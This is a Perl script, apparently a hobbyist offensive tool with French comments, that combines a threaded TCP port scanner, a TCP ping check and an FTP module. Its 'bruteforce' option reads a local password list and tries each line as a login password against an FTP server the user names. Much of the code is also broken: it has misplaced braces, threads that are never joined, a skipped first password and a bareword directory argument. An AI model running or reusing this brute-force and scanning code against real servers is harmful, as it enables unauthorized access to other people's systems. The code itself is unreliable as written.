=begin comment
Copyright © 2020 Gary Smith

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
=end comment
=cut



use Net::Ping;
use Net::FTP;
use Socket;
use Term::ANSIColor;
use Win32::Console::ANSI;
use threads; 




print "\033[2J";    #clear the screen
print "\033[0;0H"; #jump to 0,0

print color 'red';
print 
"
{_____                                      {__        {__                    
{__   {__                                   {__        {__ {_                 
{__    {__   {__       {__    {_ {__        {__   {_   {__   {_ {___   {__    
{__    {__ {_   {__  {_   {__ {_  {__ {_____{__  {__   {__{__ {__    {_   {__ 
{__    {__{_____ {__{_____ {__{_   {__      {__ {_ {__ {__{__ {__   {_____ {__
{__   {__ {_        {_        {__ {__       {_ {_    {____{__ {__   {_        
{_____      {____     {____   {__           {__        {__{__{___     {____   
                              {__                                                               	   
                                                                                                              \n";
print color 'reset';
print color 'green';
print "Autor: ";
print color 'reset';
print color 'red';
print "Gary\n";


$| = 1; # so \r works right

#Définition des variables
#--Variables globales---
my $command;
my $ipscan;

#--Variables scan---
my ($ip, $protocol, $port, $myhouse, $yourhouse, $log);
$protocol = getprotobyname('tcp');

#--Variables bruteforce---
my ($url, $ftp, $option, $identifiant, $password);

($ip, $port, $port_stop, $log) = @ARGV;
#------------------------------------

#Appels de fonctions et code global
Initialize(); 

if ($command eq "scan") {
	Select();
	print LOG_FILE "The following ports are open on $ip between port $port and $port_stop\n\n";
	print "Checking $ip for open ports..\n";
	$thr1 = threads->new(\&Threadsfunction, 'premier');
	$thr2 = threads->new(\&Threadsfunction, 'deuxieme');
	$thr3 = threads->new(\&Threadsfunction, 'troisieme');
	} 

elsif($command eq "connect"){
	Bruteforce();
}

elsif($command eq "ping"){
	Ping();
}

else{exit;}




#---------------------------------------

sub Threadsfunction{
	for (; $port < $port_stop; $port += 1) {
		Scan();
	}
}

sub Threadstest {
	print"dans le thread \n"
}

#Déclaration des fonctions
sub Initialize{
	print color 'blue';
	print "Commands list:
			-'scan' scanne les ports ouverts d'une ip(fonctionnel)
			-'ping' test le ping d'un serveur (en beta)
			-'connect' connecte la machine a un serveur ftp (en developpement) \n";
	print color 'reset';
	print color 'red';
	print "perl-testing.0.2:";
	print color 'reset';
	print color 'white';
	print "~# ";
	$command = <>;
	chomp $command;
}


sub Select{
	print "Specify the host you want scan:> ";
	$ipscan = <>; #my est un mot clé qui permet de déclarer une variable
	chomp $ipscan;
	if (length($ipscan) > 0){

		print "Specify the port you want scan (Default all):> ";
		my $portscan = <>;
		chomp $portscan;

		if ($ip eq "-h") {
    		&usage();
		}

		$ip = "$ipscan" if not $ip;
		$port = "$portscan" if not $port;
		$port_stop = 1024 if not $port_stop;
		$log = "qsopenports.txt" if not $log;

		unless (open(LOG_FILE, ">>$log")) {
    		die "Can't open log file $log for writing: $!\n"
	}
	# Make file handle hot so the buffer is flushed after every write
	select((select(LOG_FILE), $| = 1)[0]);

}

sub Scan{

    	socket(SOCKET, PF_INET, SOCK_STREAM, $protocol);
    	$yourhouse = inet_aton($ip);

    	$myhouse = sockaddr_in($port, $yourhouse);

    	if (!connect(SOCKET, $myhouse)) {
        	printf "%d\r", $port;
    	} 
    	else {
        	printf "%d  <- open\n", $port;
        	print LOG_FILE "$port\n";
        	close SOCKET || die "close: $!";
    	}
    }

sub Close(){
	close LOG_FILE || die "close: $!";
	printf "QuickScan complete.\n";
	printf "Those are the open ports for: $ip\n";
}

sub usage() {
    print "Usage: ./quickscan [host] [start port] [stop port] [logfile]\n";
    print "Defaults to localhost and port 1 and port 1024 qsopenports.txt\n";
    exit 0;
	}
}

sub Bruteforce{
	print "Select the url you want to connect:> ";
	$url = <>;
	chomp $url;
	$ftp = Net::FTP->new($url,Debug =>0 )
		or die "Cannot connect to this host: $@";
	print "Please select an option:
	login
	bruteforce\n";
	print ":>";
	$option = <>;
	chomp $option;
	if($option eq "login"){
		#-------------On définit un identifiant et on demande de le spécifier---------------------
		print "Please enter the id:> ";
		$identifiant = <>;
		chomp $identifiant;

		#-------------On définit un password--------------------------
		print "Please enter the password:> ";
		$password = <>;
		chomp $password;

		#-------------On se connecte-----------------------------------
		$ftp->login($identifiant, $password)
		or die "Cannot login ", $ftp->message;

		#-----------On définit un répertoire d'usage------------------
		print "Please enter a directory:> ";
		my $directory = <>;
		chomp $directory;
		$ftp->cwd(directory)
		or die "Cannot change working directory ", $ftp->message;

		#----------On définit le choix du nom de fichier---------------
		print "Please enter a file name:> ";
		my $filename = <>;
		chomp $filename;
		$ftp->get($filename)
		or die "get failed ", $ftp->message;

		#---------On ferme la connexion au ftp--------------------------
		$ftp->quit;
	}

	#---------------Bruteforce-------------------------------------------
	if($option eq "bruteforce"){
		print "Entrez l'identifiant:> ";
		my $idbruteforce= <>;
		chomp $idbruteforce;

	#--------------Récupération du fichier txt------------
		open (my $fh, '<', 'C:\\passwordlist.txt') or die "Impossible d'ouvrir le fichier";
		my $passlist = <$fh>;
		while (my $line = <$fh>){ #La boucle while récupère ligne par ligne le fichier txt et entre la donnée en mdp sur le serveur
			print $line;
			$ftp->login($idbruteforce, $line)
			or print"Access Denied!\n \n"; #$ftp->message
		}

	}
}

	

sub Ping{
	my $p = Net::Ping->new("tcp");
	print "Select a host:> ";
	my $host = <>;
	chomp $host;

	if(length ($host) > 0){     #On s'assure que l'utilisateur a bien tapé quelque chose donc que la chaine est supérieure à 0.
        
        $p->port_number("80");

		if ($p->ping($host)){
			print "alive";
			exit;
		}

		else {
			print "Not alive :/";
			exit;
		}
	}
	else {
		print "Error! Make sure you type a host..."; #Si l'utilisateur n'as rien tapé on lui affiche ce message
	}
}




















